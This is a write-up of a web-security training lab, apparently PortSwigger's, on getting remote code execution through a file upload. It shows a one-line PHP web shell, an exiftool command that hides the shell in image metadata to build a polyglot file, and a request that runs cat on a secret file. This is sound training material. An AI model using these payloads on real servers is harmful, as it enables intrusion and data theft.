## Remote code execution via polyglot web shell upload

This lab contains a vulnerable image upload function. Although it checks the contents of the file to verify that it is a genuine image, it is still possible to upload and execute server-side code.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter

## Notes

- Possibility to leave a comment on a post
- File Upload feature on user account


## Resume

1. Login with wiener:peter
2. Upload **php** shell
3. RCE with **php** shell


## Solve 

The **file upload** feature is on `/my-account`, we have to login with wiener:peter. We can update our **Avatar** via file upload. We will upload our shell.php trying to RCE.

**shell.php**

```php
<?=`$_GET[0]`?>
```

This give us an error : 

```
HTTP/2 403 Forbidden
Date: Wed, 29 Apr 2026 11:40:45 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 171



Error: file is not a valid image
Sorry, there was an error uploading your file.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```

To bypass, we will have to use a **polyglot** file : 


1. Download any images
2. use exiftool to add metadata : `exiftool -Comment='<?=`$_GET[0]`?>' image.png -o exploit.php`
3. Upload again

Once it's uploaded, we can right click over our avatar and open the "image" in new tab. In order to get `/home/carlos/secret` we can use the web shell : 

`/files/avatars/exploit.php?0=cat%20/home/carlos/secret` -> "t1i5UDhoboJatp5b5kr0j1FISoheoxKj"